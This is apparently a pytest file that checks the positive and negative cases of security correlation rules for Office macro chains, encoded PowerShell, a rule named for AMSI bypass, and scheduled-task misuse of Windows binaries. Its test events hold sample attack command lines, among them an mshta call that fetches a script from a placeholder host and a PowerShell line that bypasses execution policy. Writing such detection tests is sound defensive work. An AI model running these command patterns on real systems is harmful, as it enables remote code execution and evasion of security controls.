import pytest

from src.core.correlation.rules.week1.office_macro_chain import office_macro_chain, office_macro_spawn_powershell
from src.core.correlation.rules.week1.powershell_encoded import powershell_encoded
from src.core.correlation.rules.week1.amsi_bypass import corr_amsi_bypass
from src.core.correlation.rules.week1.scheduled_task_lolbin import scheduled_task_lolbin


def test_office_macro_spawn_powershell_positive():
    evt = {
        'event.source': 'document.docm',
        'process': 'WINWORD.EXE',
        'cmdline': 'winword.exe /some arg',
        'children': [{'process': 'powershell.exe', 'cmdline': 'powershell -EncodedCommand aGVsbG8='}]
    }
    assert office_macro_spawn_powershell(evt) is True


def test_office_macro_chain_positive():
    evt = {'parent_process': 'winword.exe', 'child_process': 'powershell.exe', 'network_outbound_domains': ['bad.example.com']}
    assert office_macro_chain(evt) is True


def test_powershell_encoded_positive():
    evt = {'process': 'powershell.exe', 'cmdline': 'powershell -EncodedCommand aGVsbG8='}
    assert powershell_encoded(evt) is True


def test_amsi_bypass_positive():
    evt = {'cmdline': 'powershell -ExecutionPolicy Bypass -NoProfile -EncodedCommand aGVsbG8='}
    assert corr_amsi_bypass(evt) is True


def test_scheduled_task_lolbin_positive():
    evt = {'process': 'mshta.exe', 'cmdline': 'mshta.exe http://example.com/payload.vbs', 'schedule': {'time': 'daily'}}
    assert scheduled_task_lolbin(evt) is True


def test_rules_negative_cases():
    assert office_macro_spawn_powershell({'event.source': '', 'process': ''}) is False
    assert office_macro_chain({'parent_process': '', 'child_process': ''}) is False
    assert powershell_encoded({'process': 'cmd.exe', 'cmdline': 'echo hello'}) is False
    assert corr_amsi_bypass({'cmdline': 'just a normal command'}) is False
    assert scheduled_task_lolbin({'process': 'notepad.exe', 'cmdline': '', 'schedule': {}}) is False
